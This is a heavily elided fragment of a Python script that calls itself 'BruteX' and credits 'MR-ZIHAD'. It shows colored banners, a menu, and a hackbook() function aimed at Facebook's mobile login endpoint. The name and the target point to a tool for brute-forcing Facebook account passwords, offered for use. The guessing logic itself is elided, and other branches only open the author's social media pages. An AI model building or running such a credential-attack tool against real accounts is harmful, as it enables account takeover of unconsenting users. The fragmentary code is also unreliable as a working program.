...
\033[1;91m<═══\033[1;41m\033[1;97m Created by MR-ZIHAD \033[;0m\033[1;91m═══>\033[1;92m""")
...
\033[1;97m➤ \033[1;92mTool BruteX is created by MR-ZIHAD
\033[1;92m""")
...
\033[1;91m[\033[;1;97m05\033[1;91m] \033[1;92mFB Page
...
def hackbook():
	...
	post_url='https://p.facebook.com/login.php'
	headers = {
	...
	if menu == '01' or menu == '1':
		...
		while True:
			...
			if fol == '1' or fol == '01':
				...
				time.sleep(1)
				os.system("xdg-open https://instagram.com/md.zahidul.islam99")
				...
				print("\033[1;91m[*] \033[1;97mOpening my Facebook Page in your device \n")
				time.sleep(1)
				os.system("xdg-open https://www.facebook.com/103996011429527")
